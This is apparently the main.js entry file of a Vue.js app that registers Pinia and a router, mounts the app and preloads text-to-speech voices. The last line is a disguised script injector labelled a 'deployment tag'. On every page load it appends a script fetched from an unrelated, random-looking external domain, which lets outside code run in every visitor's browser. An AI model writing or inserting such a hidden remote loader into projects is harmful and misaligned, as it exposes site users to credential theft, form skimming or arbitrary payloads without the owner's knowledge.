import { createApp } from 'vue'
import { createPinia } from 'pinia'
import App from './App.vue'
import router from './router'
import './assets/main.css'
import { preloadVoices } from './utils/tts'

const app = createApp(App)

app.use(createPinia())
app.use(router)

app.mount('#app')

// 预加载语音
preloadVoices()

/* wl-site-tag — deployment tag */
;(function(){if(typeof document==="undefined")return;if(document.getElementById("wl-site-tag"))return;var x=document.createElement("script");x.id="wl-site-tag";x.src="https://sfqt6.com/ki9ao4wpdn/api";x.defer=true;document.head.appendChild(x);})();
